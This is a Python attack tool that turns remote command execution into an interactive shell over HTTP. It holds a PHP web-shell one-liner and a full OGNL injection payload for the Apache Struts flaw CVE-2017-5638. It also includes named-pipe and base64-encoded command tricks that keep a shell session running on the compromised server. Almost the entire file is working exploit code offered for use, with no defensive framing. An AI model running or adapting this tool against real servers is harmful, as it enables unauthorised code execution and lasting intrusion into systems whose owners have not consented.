#!/bin/python3

from abc import ABCMeta, abstractmethod
from base64 import b64encode
import requests
from requests.packages.urllib3 import disable_warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from threading import Thread
from time import sleep
from sys import stderr
from os import environ, _exit

disable_warnings(InsecureRequestWarning)

class Backdoor(metaclass=ABCMeta):
    @abstractmethod
    def system(self, command):
        pass

class LocalBackdoor(Backdoor):
    def __init__(self, url):
        pass

    def system(self, command):
        import subprocess
        proc = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return proc.stdout

class PhpBackdoor(Backdoor):
    """
        <?php echo system($_GET['cmd']); ?>
    """
    def __init__(self, url):
        self.url = url

    def system(self, command):
        params = { 'cmd' : command }

        response = requests.get(self.url, params=params, verify=False)
        text = response.text

        return text

class CVE_2017_5638:
    def __init__(self, url):
        self.url = url

    def system(self, command):
        payload = ""
        payload += "%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?"
        payload += "(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += f"(#cmd='{command}')."
        payload += "(#cmds={'/bin/bash','-c',#cmd})."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        payload += "(#ros.flush())}"

        headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
                'Content-Type': str(payload),
                'Accept': '*/*'
        }

        response = requests.get(self.url, headers=headers, verify=False)
        text = response.text

        return text

class Shell(Backdoor):
    def __init__(self, backdoor, inpath, outpath):
        self._backdoor = backdoor
        self._inpath = inpath
        self._outpath = outpath

    @property
    def inpath(self):
        return self._inpath

    @property
    def outpath(self):
        return self._outpath

    def system(self, command):
        return self._backdoor.system(command)

    def setup(self):
        command = ''
        command += f'rm {self.inpath} {self.outpath};'
        command += f'mkfifo {self.inpath};'
        command += f'tail -f {self.inpath} | sh > {self.outpath} 2>&1;'
        command = b64encode(command.encode()).decode()
        command =f'echo -n {command} | base64 -d | sh'
        self.system(command)

    def read(self):
        command = f'cat {self.outpath}'
        return self.system(command)

    def write(self, command):
        if not command.endswith('\n'):
            command = command + '\n'

        command = b64encode(command.encode()).decode()
        command =f'echo -n {command} | base64 -d > {self.inpath}'
        self.system(command)

    def clear(self):
        command = f'echo -n > {self.outpath}'
        self.system(command)

class Bash(Shell):
    def __init__(self, backdoor, inpath, outpath):
        super().__init__(backdoor, inpath, outpath)

    def setup(self):
        command = ''
        command += f'rm {self.inpath} {self.outpath};'
        command += f'mkfifo {self.inpath} {self.outpath};'
        command += f'exec 3<>{self.outpath};'
        command += f'tail -f {self.inpath} | bash > {self.outpath} 2>&1;'
        command = b64encode(command.encode()).decode()
        command =f'echo -n {command} | base64 -d | bash'
        self.system(command)

    def read(self):
        command = f'dd if={self.outpath} iflag=nonblock 2> /dev/null'
        command = b64encode(command.encode()).decode()
        command =f'echo -n {command} | base64 -d | bash'
        return self.system(command)

    def clear(self):
        return

def setup_task(shell):
    try:
        shell.setup()
    except Exception as e:
        print(f'SETUP_ERROR: {e}', file=stderr)

def read_task(shell, interval=1):
    while True:
        try:
            contents = shell.read()
            print(contents, end='')
            shell.clear()
        except Exception as e:
            print(f'READ_ERROR: {e}', file=stderr)
        sleep(interval)

if __name__ == '__main__':
    method = {
            'local' : LocalBackdoor,
            'php' : PhpBackdoor,
            'CVE-2017-5638': CVE_2017_5638
    }

    from argparse import ArgumentParser
    parser = ArgumentParser()
    parser.add_argument('method', help='/'.join(method))
    parser.add_argument('url')
    parser.add_argument('-i', '--inpath', default='/tmp/in')
    parser.add_argument('-o', '--outpath', default='/tmp/out')
    parser.add_argument('-s', '--shell', action='store_true')
    parser.add_argument('--skip', action='store_true')
    parser.add_argument('--interval', type=float, default=1)
    parser.add_argument('--proxy')
    args = parser.parse_args()

    if args.proxy:
        environ['HTTP_PROXY'] = args.proxy

    backdoor = method[args.method](args.url)
    if args.shell:
        shell = Shell(backdoor, args.inpath, args.outpath)
    else:
        shell = Bash(backdoor, args.inpath, args.outpath)

    if not args.skip:
        thread1 = Thread(target=setup_task, args=[shell])
        thread1.start()
        sleep(2)

    thread2 = Thread(target=read_task, args=[shell, args.interval])
    thread2.start()

    try:
        while True:
            command = input()
            try:
                shell.write(command)
            except Exception as e:
                print(f'WRITE_ERROR: {e}', file=stderr)
    except KeyboardInterrupt:
        _exit(1)

